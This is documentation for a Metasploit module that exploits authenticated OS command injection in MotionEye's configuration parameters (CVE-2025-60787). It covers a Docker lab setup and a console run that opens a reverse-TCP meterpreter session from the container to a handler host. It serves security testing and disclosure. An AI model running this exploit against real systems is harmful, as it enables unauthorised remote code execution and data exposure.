## Vulnerable Application

This module exploits a template injection vulnerability in the MotionEye.

MotionEye is vulnerable to OS Command Injection in configuration parameters such as image_file_name. 
Unsanitized user input is written to Motion configuration files, 
allowing remote authenticated attackers with admin access to achieve code execution when Motion is restarted.

This vulnerability affects MotionEye versions <= 0.43.1b4 are vulnerable.
Successful exploitation may result in the remote code execution under the privileges
of the web server, potentially exposing sensitive data or disrupting survey operations.

An attacker can execute arbitrary system commands in the context of the user running the web server.

## Testing

1. Use Docker to set up the MotionEye app

`docker run -p 9999:8765 ghcr.io/motioneye-project/motioneye@sha256:718171663d28f04f2fb97244f8ef03a814367b06078fc00685acc47f61663890`

2. Open http://127.0.0.1:9999/ and make sure the app is available

## Scenario

```
msf6 > use exploit/multi/http/motioneye_auth_rce_cve_2025_60787
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set RPORT 9999
RPORT => 9999
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set FETCH_SRVHOST 172.17.0.1
FETCH_SRVHOST => 172.17.0.1
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set PASSWORD 12345
PASSWORD => 12345
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > run

[*] Started reverse TCP handler on 192.168.19.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected version 0.43.14, which is vulnerable
[*] Adding camera...
[+] Camera successfully added
[*] Setting up exploit...
[+] Exploit installation completed
[*] Executing exploit...
[+] Execution exploit request sent successfully
[*] Removing camera
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.19.130:4444 -> 172.17.0.2:38124) at 2025-10-04 21:08:57 -0400
[+] Camera removed successfully

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Debian 13.1 (Linux 6.11.2-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```